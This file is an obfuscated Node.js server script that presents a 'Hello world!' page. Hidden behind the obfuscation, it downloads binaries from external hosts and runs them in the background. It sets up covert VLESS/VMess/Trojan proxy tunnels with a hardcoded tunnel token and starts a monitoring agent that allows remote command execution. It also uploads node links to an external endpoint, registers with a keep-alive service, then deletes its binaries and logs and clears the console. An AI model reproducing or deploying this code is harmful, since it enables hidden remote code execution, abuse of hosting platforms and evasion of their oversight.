const _0x36d63e=_0x4508;(function(_0x2a4873,_0xb4e57){const _0x1a83a0=_0x4508,_0x296539=_0x2a4873();while(!![]){try{const _0x14e4e4=parseInt(_0x1a83a0(0xb0))/0x1*(-parseInt(_0x1a83a0(0xad))/0x2)+parseInt(_0x1a83a0(0xf8))/0x3*(-parseInt(_0x1a83a0(0xb3))/0x4)+parseInt(_0x1a83a0(0x74))/0x5+parseInt(_0x1a83a0(0x73))/0x6+-parseInt(_0x1a83a0(0xf6))/0x7*(parseInt(_0x1a83a0(0x81))/0x8)+parseInt(_0x1a83a0(0x109))/0x9*(-parseInt(_0x1a83a0(0x93))/0xa)+parseInt(_0x1a83a0(0xe7))/0xb*(parseInt(_0x1a83a0(0xee))/0xc);if(_0x14e4e4===_0xb4e57)break;else _0x296539['push'](_0x296539['shift']());}catch(_0x106b03){_0x296539['push'](_0x296539['shift']());}}}(_0x1d20,0x47e82));const express=require(_0x36d63e(0x7c)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x36d63e(0xb9)),exec=promisify(require('child_process')[_0x36d63e(0xef)]),{execSync}=require(_0x36d63e(0xd9)),UPLOAD_URL=process[_0x36d63e(0x11b)][_0x36d63e(0xd4)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x36d63e(0x11b)][_0x36d63e(0x85)]||![],FILE_PATH=process[_0x36d63e(0x11b)][_0x36d63e(0xa6)]||_0x36d63e(0xe5),SUB_PATH=process['env'][_0x36d63e(0x10d)]||_0x36d63e(0xdf),PORT=process[_0x36d63e(0x11b)]['SERVER_PORT']||process[_0x36d63e(0x11b)][_0x36d63e(0x8f)]||0xbb8,UUID=process['env']['UUID']||_0x36d63e(0x9b),NEZHA_SERVER=process[_0x36d63e(0x11b)][_0x36d63e(0x6a)]||'',NEZHA_PORT=process[_0x36d63e(0x11b)][_0x36d63e(0xc2)]||'',NEZHA_KEY=process[_0x36d63e(0x11b)][_0x36d63e(0x80)]||'',ARGO_DOMAIN=process[_0x36d63e(0x11b)][_0x36d63e(0x6d)]||'shiper.aser.cloudns.pro',ARGO_AUTH=process['env'][_0x36d63e(0x113)]||_0x36d63e(0x99),ARGO_PORT=process[_0x36d63e(0x11b)][_0x36d63e(0xde)]||0x1f41,CFIP=process['env'][_0x36d63e(0x66)]||_0x36d63e(0xae),CFPORT=process['env'][_0x36d63e(0xc7)]||0x1bb,NAME=process['env'][_0x36d63e(0x7d)]||_0x36d63e(0xaa);function _0x1d20(){const _0x5c476a=['curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','NEZHA_PORT','2087','\x0avless://','log','arm','CFPORT','none','writeFileSync','./bot','2083','fileUrl','tcp','pop','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','web','trojan','block','utf-8','UPLOAD_URL','xtls-rprx-vision','\x20failed:\x20','status','Hello\x20world!','child_process','./php','blackhole','trim','has','ARGO_PORT','sub','direct','fileName','npm\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','join','./tmp','get','11pfLWct','/tunnel.yml\x20run','Content-Type','bot','https://arm64.ssss.nyc.mn/2go','https+local://8.8.8.8/dns-query','web\x20is\x20running','4868508BPimnk','exec','error','data','http','unshift','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','/npm\x20-s\x20','14eClbjH','/php\x20-c\x20\x22','144mBpQiR','filter','tunnel.yml','forEach','unlinkSync','php','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','sub.txt','catch','config.json','\x20>/dev/null\x202>&1','aarch64','split','\x20successfully','vless','Download\x20','push','225iIsQMy','match','close','length','SUB_PATH','set','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','https://amd64.ssss.nyc.mn/2go','/api/add-subscriptions','\x20already\x20exists','ARGO_AUTH','post','/dev/null','\x0aclient_secret:\x20','ArgoDomain:','&path=%2Ftrojan-argo%3Fed%3D2560#','?encryption=none&security=tls&sni=','/web\x20-c\x20','env','unlink','arm64','Empowerment\x20failed\x20for\x20','response','443','添加URL失败:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','CFIP','includes','./npm','Error\x20downloading\x20files:','NEZHA_SERVER','true','php\x20is\x20running','ARGO_DOMAIN','tunnel.json','tls','stream','/api/add-nodes','finish','2922564Zwcoso','580250FEXLiX','false','\x20>/dev/null\x202>&1\x20&','message','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','bot\x20is\x20running','Skipping\x20adding\x20automatic\x20access\x20task','express','NAME','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NEZHA_KEY','1552136mFEHfL','then','https://arm64.ssss.nyc.mn/agent','toString','AUTO_ACCESS','send','8443','/vless-argo','base64','127.0.0.1','createWriteStream','npm\x20is\x20running','listen','amd','PORT','2096','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','http\x20server\x20is\x20running\x20on\x20port:','4490iTFuno','rm\x20-rf\x20','TunnelSecret','\x20-p\x20','nohup\x20','npm','eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiMDkwMTY0MWEtZTRlOC00ZmM3LWEyNjMtNTM2NmI3MDhjODk1IiwicyI6Ik16WmlZMkppTlRRdE1tRXhaaTAwWW1VeUxUbGlPVEV0TmpNMlpXUmlZVGxqWmpVNSJ9','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','9afd1229-b893-40c1-84dd-51e7ce204913','vmess','readFileSync','./web','https://amd64.ssss.nyc.mn/v1','existsSync','arch','/api/delete-nodes','2053','&type=ws&host=','Error\x20executing\x20command:\x20','FILE_PATH','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','stringify','quic','sniper','\x0a\x20\x20tunnel:\x20','/trojan-argo','62fFUQau','www.visa.com.sg','\x0a\x20\x20credentials-file:\x20','3064gkMboC','test','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','18340orxaSE','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','from','clear','map','util','NEZHA\x20variable\x20is\x20empty,skip\x20running','/bot\x20','boot.log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','application/json','config.yaml','php\x20running\x20error:\x20'];_0x1d20=function(){return _0x5c476a;};return _0x1d20();}!fs[_0x36d63e(0xa0)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x36d63e(0xc5)](FILE_PATH+_0x36d63e(0x112));let npmPath=path[_0x36d63e(0xe4)](FILE_PATH,'npm'),phpPath=path['join'](FILE_PATH,'php'),webPath=path[_0x36d63e(0xe4)](FILE_PATH,_0x36d63e(0xd0)),botPath=path['join'](FILE_PATH,'bot'),subPath=path[_0x36d63e(0xe4)](FILE_PATH,_0x36d63e(0xff)),listPath=path[_0x36d63e(0xe4)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x36d63e(0xe4)](FILE_PATH,'config.json');function deleteNodes(){const _0x195730=_0x36d63e;try{if(!UPLOAD_URL)return;if(!fs[_0x195730(0xa0)](subPath))return;let _0x4d6f0f;try{_0x4d6f0f=fs[_0x195730(0x9d)](subPath,_0x195730(0xd3));}catch{return null;}const _0x4a8752=Buffer[_0x195730(0xb6)](_0x4d6f0f,_0x195730(0x89))[_0x195730(0x84)]('utf-8'),_0x248090=_0x4a8752['split']('\x0a')[_0x195730(0xf9)](_0x4e5eb4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4e5eb4));if(_0x248090['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x195730(0xa2),JSON[_0x195730(0xa8)]({'nodes':_0x248090}),{'headers':{'Content-Type':_0x195730(0xbe)}})[_0x195730(0x100)](_0xbbbbd1=>{return null;});}catch(_0x5986d9){return null;}}function cleanupOldFiles(){const _0x17d1fb=_0x36d63e,_0x4f2032=['web',_0x17d1fb(0xea),'npm',_0x17d1fb(0xfd),'sub.txt','boot.log'];_0x4f2032[_0x17d1fb(0xfb)](_0x23ce97=>{const _0x1952ca=_0x17d1fb,_0x58d720=path[_0x1952ca(0xe4)](FILE_PATH,_0x23ce97);fs[_0x1952ca(0x11c)](_0x58d720,()=>{});});}app[_0x36d63e(0xe6)]('/',function(_0x3ad942,_0x48360){const _0x3832d1=_0x36d63e;_0x48360[_0x3832d1(0x86)](_0x3832d1(0xd8));});const config={'log':{'access':'/dev/null','error':_0x36d63e(0x115),'loglevel':_0x36d63e(0xc8)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x36d63e(0x106),'settings':{'clients':[{'id':UUID,'flow':_0x36d63e(0xd5)}],'decryption':_0x36d63e(0xc8),'fallbacks':[{'dest':0xbb9},{'path':_0x36d63e(0x88),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x36d63e(0xac),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x36d63e(0x8a),'protocol':_0x36d63e(0x106),'settings':{'clients':[{'id':UUID}],'decryption':_0x36d63e(0xc8)},'streamSettings':{'network':_0x36d63e(0xcd),'security':_0x36d63e(0xc8)}},{'port':0xbba,'listen':_0x36d63e(0x8a),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x36d63e(0xc8)},'streamSettings':{'network':'ws','security':_0x36d63e(0xc8),'wsSettings':{'path':_0x36d63e(0x88)}},'sniffing':{'enabled':!![],'destOverride':[_0x36d63e(0xf2),_0x36d63e(0x6f),_0x36d63e(0xa9)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x36d63e(0x8a),'protocol':_0x36d63e(0x9c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x36d63e(0xf2),_0x36d63e(0x6f),_0x36d63e(0xa9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x36d63e(0x8a),'protocol':_0x36d63e(0xd1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x36d63e(0xc8),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x36d63e(0xf2),_0x36d63e(0x6f),_0x36d63e(0xa9)],'metadataOnly':![]}}],'dns':{'servers':[_0x36d63e(0xec)]},'outbounds':[{'protocol':'freedom','tag':_0x36d63e(0xe0)},{'protocol':_0x36d63e(0xdb),'tag':_0x36d63e(0xd2)}]};fs[_0x36d63e(0xc9)](path[_0x36d63e(0xe4)](FILE_PATH,_0x36d63e(0x101)),JSON[_0x36d63e(0xa8)](config,null,0x2));function getSystemArchitecture(){const _0x22ddf7=_0x36d63e,_0x3e2a29=os[_0x22ddf7(0xa1)]();return _0x3e2a29===_0x22ddf7(0xc6)||_0x3e2a29===_0x22ddf7(0x11d)||_0x3e2a29===_0x22ddf7(0x103)?_0x22ddf7(0xc6):_0x22ddf7(0x8e);}function downloadFile(_0x501ae8,_0x3fd583,_0x32919b){const _0x13b7d9=_0x36d63e,_0x58af1d=path[_0x13b7d9(0xe4)](FILE_PATH,_0x501ae8),_0x46fbbf=fs[_0x13b7d9(0x8b)](_0x58af1d);axios({'method':_0x13b7d9(0xe6),'url':_0x3fd583,'responseType':_0x13b7d9(0x70)})[_0x13b7d9(0x82)](_0x292ddf=>{const _0x1be7d1=_0x13b7d9;_0x292ddf[_0x1be7d1(0xf1)]['pipe'](_0x46fbbf),_0x46fbbf['on'](_0x1be7d1(0x72),()=>{const _0x3545e1=_0x1be7d1;_0x46fbbf[_0x3545e1(0x10b)](),console[_0x3545e1(0xc5)](_0x3545e1(0x107)+_0x501ae8+_0x3545e1(0x105)),_0x32919b(null,_0x501ae8);}),_0x46fbbf['on']('error',_0x4a47f7=>{const _0x371518=_0x1be7d1;fs[_0x371518(0x11c)](_0x58af1d,()=>{});const _0x42b2a8='Download\x20'+_0x501ae8+_0x371518(0xd6)+_0x4a47f7[_0x371518(0x77)];console['error'](_0x42b2a8),_0x32919b(_0x42b2a8);});})[_0x13b7d9(0x100)](_0x32f5d6=>{const _0x316024=_0x13b7d9,_0x3adeb1=_0x316024(0x107)+_0x501ae8+_0x316024(0xd6)+_0x32f5d6[_0x316024(0x77)];console[_0x316024(0xf0)](_0x3adeb1),_0x32919b(_0x3adeb1);});}async function downloadFilesAndRun(){const _0x32b301=_0x36d63e,_0x57635d=getSystemArchitecture(),_0xfd315a=getFilesForArchitecture(_0x57635d);if(_0xfd315a[_0x32b301(0x10c)]===0x0){console['log'](_0x32b301(0xcf));return;}const _0x4f0edd=_0xfd315a[_0x32b301(0xb8)](_0x20d636=>{return new Promise((_0x4ae3d9,_0x1b5eb0)=>{const _0x4169a0=_0x4508;downloadFile(_0x20d636[_0x4169a0(0xe1)],_0x20d636[_0x4169a0(0xcc)],(_0x5d399e,_0x212937)=>{_0x5d399e?_0x1b5eb0(_0x5d399e):_0x4ae3d9(_0x212937);});});});try{await Promise['all'](_0x4f0edd);}catch(_0x5a2f09){console[_0x32b301(0xf0)](_0x32b301(0x69),_0x5a2f09);return;}function _0x1b38ca(_0x2ca6ab){const _0x3e90ca=_0x32b301,_0x2359f6=0x1fd;_0x2ca6ab[_0x3e90ca(0xfb)](_0x3702c=>{const _0x25752f=_0x3e90ca,_0x11b85c=path[_0x25752f(0xe4)](FILE_PATH,_0x3702c);fs[_0x25752f(0xa0)](_0x11b85c)&&fs['chmod'](_0x11b85c,_0x2359f6,_0x144da2=>{const _0x1db540=_0x25752f;_0x144da2?console[_0x1db540(0xf0)](_0x1db540(0x11e)+_0x11b85c+':\x20'+_0x144da2):console[_0x1db540(0xc5)]('Empowerment\x20success\x20for\x20'+_0x11b85c+':\x20'+_0x2359f6[_0x1db540(0x84)](0x8));});});}const _0x430e44=NEZHA_PORT?[_0x32b301(0x68),_0x32b301(0x9e),_0x32b301(0xca)]:[_0x32b301(0xda),_0x32b301(0x9e),'./bot'];_0x1b38ca(_0x430e44);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x30768c=NEZHA_SERVER[_0x32b301(0x67)](':')?NEZHA_SERVER[_0x32b301(0x104)](':')[_0x32b301(0xce)]():'',_0x2107c9=new Set(['443','8443',_0x32b301(0x90),_0x32b301(0xc3),_0x32b301(0xcb),_0x32b301(0xa3)]),_0x5a9f6d=_0x2107c9[_0x32b301(0xdd)](_0x30768c)?_0x32b301(0x6b):_0x32b301(0x75),_0x10c1c8=_0x32b301(0x116)+NEZHA_KEY+_0x32b301(0x10f)+NEZHA_SERVER+_0x32b301(0x7e)+_0x5a9f6d+_0x32b301(0x78)+UUID;fs[_0x32b301(0xc9)](path['join'](FILE_PATH,_0x32b301(0xbf)),_0x10c1c8);const _0x438e30='nohup\x20'+FILE_PATH+_0x32b301(0xf7)+FILE_PATH+_0x32b301(0x65);try{await exec(_0x438e30),console['log'](_0x32b301(0x6c)),await new Promise(_0x440927=>setTimeout(_0x440927,0x3e8));}catch(_0x48d05f){console[_0x32b301(0xf0)](_0x32b301(0xc0)+_0x48d05f);}}else{let _0x175cad='';const _0x267bdc=[_0x32b301(0x120),_0x32b301(0x87),'2096','2087','2083',_0x32b301(0xa3)];_0x267bdc[_0x32b301(0x67)](NEZHA_PORT)&&(_0x175cad='--tls');const _0x114e59=_0x32b301(0x97)+FILE_PATH+_0x32b301(0xf5)+NEZHA_SERVER+':'+NEZHA_PORT+_0x32b301(0x96)+NEZHA_KEY+'\x20'+_0x175cad+_0x32b301(0x76);try{await exec(_0x114e59),console[_0x32b301(0xc5)](_0x32b301(0x8c)),await new Promise(_0x4a8bd9=>setTimeout(_0x4a8bd9,0x3e8));}catch(_0x1ba85e){console[_0x32b301(0xf0)](_0x32b301(0xe2)+_0x1ba85e);}}}else console[_0x32b301(0xc5)](_0x32b301(0xba));const _0x1f6e3b=_0x32b301(0x97)+FILE_PATH+_0x32b301(0x11a)+FILE_PATH+_0x32b301(0xb4);try{await exec(_0x1f6e3b),console[_0x32b301(0xc5)](_0x32b301(0xed)),await new Promise(_0x2e2cd4=>setTimeout(_0x2e2cd4,0x3e8));}catch(_0x329087){console[_0x32b301(0xf0)]('web\x20running\x20error:\x20'+_0x329087);}if(fs['existsSync'](path['join'](FILE_PATH,_0x32b301(0xea)))){let _0x153202;if(ARGO_AUTH[_0x32b301(0x10a)](/^[A-Z0-9a-z=]{120,250}$/))_0x153202=_0x32b301(0xb2)+ARGO_AUTH;else ARGO_AUTH[_0x32b301(0x10a)](/TunnelSecret/)?_0x153202='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x32b301(0xe8):_0x153202=_0x32b301(0xbd)+FILE_PATH+_0x32b301(0xa7)+ARGO_PORT;try{await exec(_0x32b301(0x97)+FILE_PATH+_0x32b301(0xbb)+_0x153202+_0x32b301(0x76)),console[_0x32b301(0xc5)](_0x32b301(0x7a)),await new Promise(_0x3cde69=>setTimeout(_0x3cde69,0x7d0));}catch(_0x48fcb3){console[_0x32b301(0xf0)](_0x32b301(0xa5)+_0x48fcb3);}}await new Promise(_0x5dccd2=>setTimeout(_0x5dccd2,0x1388));}function getFilesForArchitecture(_0x5b68da){const _0x542148=_0x36d63e;let _0x57bf41;_0x5b68da==='arm'?_0x57bf41=[{'fileName':_0x542148(0xd0),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x542148(0xea),'fileUrl':_0x542148(0xeb)}]:_0x57bf41=[{'fileName':'web','fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x542148(0xea),'fileUrl':_0x542148(0x110)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x255a9b=_0x5b68da==='arm'?_0x542148(0x83):'https://amd64.ssss.nyc.mn/agent';_0x57bf41[_0x542148(0xf3)]({'fileName':_0x542148(0x98),'fileUrl':_0x255a9b});}else{const _0x4b8bd8=_0x5b68da==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x542148(0x9f);_0x57bf41[_0x542148(0xf3)]({'fileName':_0x542148(0xfd),'fileUrl':_0x4b8bd8});}}return _0x57bf41;}function argoType(){const _0x888563=_0x36d63e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x888563(0xc5)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x888563(0x67)](_0x888563(0x95))){fs[_0x888563(0xc9)](path[_0x888563(0xe4)](FILE_PATH,_0x888563(0x6e)),ARGO_AUTH);const _0x224a90=_0x888563(0xab)+ARGO_AUTH[_0x888563(0x104)]('\x22')[0xb]+_0x888563(0xaf)+path['join'](FILE_PATH,'tunnel.json')+_0x888563(0xe3)+ARGO_DOMAIN+_0x888563(0xf4)+ARGO_PORT+_0x888563(0x79);fs[_0x888563(0xc9)](path[_0x888563(0xe4)](FILE_PATH,_0x888563(0xfa)),_0x224a90);}else console[_0x888563(0xc5)](_0x888563(0x91));}argoType();function _0x4508(_0x5c500f,_0x4a13d5){const _0x1d20b4=_0x1d20();return _0x4508=function(_0x450819,_0x4afb9c){_0x450819=_0x450819-0x65;let _0x57711f=_0x1d20b4[_0x450819];return _0x57711f;},_0x4508(_0x5c500f,_0x4a13d5);}async function extractDomains(){const _0x475894=_0x36d63e;let _0x54a1aa;if(ARGO_AUTH&&ARGO_DOMAIN)_0x54a1aa=ARGO_DOMAIN,console['log'](_0x475894(0xb5),_0x54a1aa),await _0x550a5a(_0x54a1aa);else try{const _0x594adb=fs['readFileSync'](path[_0x475894(0xe4)](FILE_PATH,_0x475894(0xbc)),'utf-8'),_0x3f6c1a=_0x594adb[_0x475894(0x104)]('\x0a'),_0x5a4a72=[];_0x3f6c1a[_0x475894(0xfb)](_0x3d1e58=>{const _0xbb9379=_0x475894,_0x46460f=_0x3d1e58[_0xbb9379(0x10a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x46460f){const _0x4729c5=_0x46460f[0x1];_0x5a4a72[_0xbb9379(0x108)](_0x4729c5);}});if(_0x5a4a72[_0x475894(0x10c)]>0x0)_0x54a1aa=_0x5a4a72[0x0],console[_0x475894(0xc5)](_0x475894(0x117),_0x54a1aa),await _0x550a5a(_0x54a1aa);else{console['log'](_0x475894(0xfe)),fs[_0x475894(0xfc)](path[_0x475894(0xe4)](FILE_PATH,_0x475894(0xbc)));async function _0x3bd201(){const _0xba9a42=_0x475894;try{await exec(_0xba9a42(0x9a));}catch(_0x4cd68d){}}_0x3bd201(),await new Promise(_0x32cf71=>setTimeout(_0x32cf71,0xbb8));const _0x4a8dd2=_0x475894(0xbd)+FILE_PATH+_0x475894(0xa7)+ARGO_PORT;try{await exec(_0x475894(0x97)+path[_0x475894(0xe4)](FILE_PATH,_0x475894(0xea))+'\x20'+_0x4a8dd2+'\x20>/dev/null\x202>&1\x20&'),console[_0x475894(0xc5)]('bot\x20is\x20running.'),await new Promise(_0x4b6a64=>setTimeout(_0x4b6a64,0xbb8)),await extractDomains();}catch(_0x48f02f){console['error'](_0x475894(0xa5)+_0x48f02f);}}}catch(_0x5f1e51){console[_0x475894(0xf0)]('Error\x20reading\x20boot.log:',_0x5f1e51);}async function _0x550a5a(_0x568f2c){const _0x4c0fd9=_0x475894,_0x725526=execSync(_0x4c0fd9(0xc1),{'encoding':'utf-8'}),_0x1fd98a=_0x725526[_0x4c0fd9(0xdc)]();return new Promise(_0x4b45d9=>{setTimeout(()=>{const _0x19a87c=_0x4508,_0x2e9df0={'v':'2','ps':NAME+'-'+_0x1fd98a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x19a87c(0xc8),'net':'ws','type':_0x19a87c(0xc8),'host':_0x568f2c,'path':'/vmess-argo?ed=2560','tls':_0x19a87c(0x6f),'sni':_0x568f2c,'alpn':''},_0x23b217=_0x19a87c(0xc4)+UUID+'@'+CFIP+':'+CFPORT+_0x19a87c(0x119)+_0x568f2c+_0x19a87c(0xa4)+_0x568f2c+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x1fd98a+'\x0a\x20\x20\x0avmess://'+Buffer[_0x19a87c(0xb6)](JSON[_0x19a87c(0xa8)](_0x2e9df0))[_0x19a87c(0x84)]('base64')+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x568f2c+_0x19a87c(0xa4)+_0x568f2c+_0x19a87c(0x118)+NAME+'-'+_0x1fd98a+'\x0a\x20\x20\x20\x20';console[_0x19a87c(0xc5)](Buffer['from'](_0x23b217)['toString'](_0x19a87c(0x89))),fs[_0x19a87c(0xc9)](subPath,Buffer[_0x19a87c(0xb6)](_0x23b217)[_0x19a87c(0x84)]('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app[_0x19a87c(0xe6)]('/'+SUB_PATH,(_0x7f04ca,_0x4fe296)=>{const _0x24fb44=_0x19a87c,_0x17bebb=Buffer[_0x24fb44(0xb6)](_0x23b217)[_0x24fb44(0x84)](_0x24fb44(0x89));_0x4fe296[_0x24fb44(0x10e)](_0x24fb44(0xe9),'text/plain;\x20charset=utf-8'),_0x4fe296[_0x24fb44(0x86)](_0x17bebb);}),_0x4b45d9(_0x23b217);},0x7d0);});}}async function uplodNodes(){const _0x2b0ffd=_0x36d63e;if(UPLOAD_URL&&PROJECT_URL){const _0x85bfaf=PROJECT_URL+'/'+SUB_PATH,_0xdda765={'subscription':[_0x85bfaf]};try{const _0x1161e4=await axios[_0x2b0ffd(0x114)](UPLOAD_URL+_0x2b0ffd(0x111),_0xdda765,{'headers':{'Content-Type':_0x2b0ffd(0xbe)}});if(_0x1161e4['status']===0xc8)console['log']('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x34daed){if(_0x34daed[_0x2b0ffd(0x11f)]){if(_0x34daed[_0x2b0ffd(0x11f)][_0x2b0ffd(0xd7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2b0ffd(0xa0)](listPath))return;const _0x45110f=fs[_0x2b0ffd(0x9d)](listPath,'utf-8'),_0x246f1d=_0x45110f[_0x2b0ffd(0x104)]('\x0a')[_0x2b0ffd(0xf9)](_0x4b3e11=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2b0ffd(0xb1)](_0x4b3e11));if(_0x246f1d[_0x2b0ffd(0x10c)]===0x0)return;const _0x4f80d1=JSON[_0x2b0ffd(0xa8)]({'nodes':_0x246f1d});try{await axios[_0x2b0ffd(0x114)](UPLOAD_URL+_0x2b0ffd(0x71),_0x4f80d1,{'headers':{'Content-Type':_0x2b0ffd(0xbe)}});if(response['status']===0xc8)console[_0x2b0ffd(0xc5)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0xd7c478){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x531df9=_0x4508,_0x26ef7b=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x26ef7b['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x26ef7b['push'](phpPath);exec(_0x531df9(0x94)+_0x26ef7b[_0x531df9(0xe4)]('\x20')+_0x531df9(0x102),_0x478dce=>{const _0x306f6e=_0x531df9;console[_0x306f6e(0xb7)](),console[_0x306f6e(0xc5)]('App\x20is\x20running'),console[_0x306f6e(0xc5)](_0x306f6e(0x7f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x440520=_0x36d63e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x440520(0xc5)](_0x440520(0x7b));return;}try{const _0x273bff=await axios[_0x440520(0x114)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x440520(0xbe)}});console['log']('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x710cd3){console[_0x440520(0xf0)](_0x440520(0x121)+_0x710cd3[_0x440520(0x77)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x36d63e(0x8d)](PORT,()=>console[_0x36d63e(0xc5)](_0x36d63e(0x92)+PORT+'!'));
